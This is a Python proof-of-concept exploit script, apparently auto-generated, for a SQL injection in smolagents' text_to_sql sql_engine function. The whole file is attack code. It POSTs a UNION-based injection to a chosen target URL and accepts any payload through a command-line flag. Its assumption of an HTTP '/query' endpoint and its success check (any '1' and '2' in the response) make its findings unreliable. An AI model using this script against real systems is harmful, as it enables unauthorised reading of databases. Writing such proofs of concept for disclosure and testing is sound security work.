#!/usr/bin/env python3
# PoC for smolagents (/tmp/smolagents)
# Path: sqli-009
# Sink: sql_engine
# Auto-generated — run with: python3 sqli_sqlalchemy_text_then_con_sql_engine.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SQL injection vulnerability in
smolagents (text_to_sql.py) - sql_engine function.

The function uses SQLAlchemy's text() to execute user-supplied query
without parameterization, allowing arbitrary SQL injection.

This script demonstrates a benign UNION-based injection to confirm
the vulnerability and extract sample data.

Usage:
    python3 poc_sqli.py --target http://vulnerable-app.com/query
"""

import argparse
import json
import sys
import requests

# ----------------------------------------------------------------------
# Configuration
# ----------------------------------------------------------------------
# Default target (override via --target or environment)
DEFAULT_TARGET = "http://localhost:5000/query"

# Payload parameter name (adjust if different)
PARAM_NAME = "query"

# Benign payload: UNION-based injection returning dummy data.
# Assumes the original SELECT returns 4 columns (from 'receipts' schema).
# Adjust column count and types if needed.
BENIGN_PAYLOAD = (
    "' UNION SELECT 1, 2, 3, 4--"
)


def exploit_sqli(target_url: str, payload: str) -> None:
    """
    Sends the SQL injection payload to the vulnerable endpoint.

    Args:
        target_url: Full URL of the vulnerable endpoint.
        payload:   SQL injection payload string.

    Raises:
        requests.exceptions.RequestException on network errors.
    """
    print(f"[*] Target   : {target_url}")
    print(f"[*] Payload  : {payload}")
    print()

    # Prepare request data
    data = {PARAM_NAME: payload}

    print("[*] Sending malicious request...")
    response = requests.post(target_url, data=data, timeout=10)

    print(f"[*] HTTP Status: {response.status_code}")
    print("[*] Response body:")

    # Try to parse as JSON, else print raw text
    try:
        parsed = response.json()
        print(json.dumps(parsed, indent=2))
    except json.JSONDecodeError:
        print(response.text)

    # Check if injection succeeded (presence of our injected numbers)
    if "1" in response.text and "2" in response.text:
        print("\n[+] SUCCESS: Injection appears to have worked!")
    else:
        print("\n[-] Injection may have failed — adjust column count or payload.")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="PoC SQL injection exploit for smolagents text_to_sql.py"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--payload",
        default=BENIGN_PAYLOAD,
        help="SQL injection payload (default: benign UNION SELECT)",
    )
    args = parser.parse_args()

    try:
        exploit_sqli(args.target, args.payload)
    except requests.exceptions.ConnectionError as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
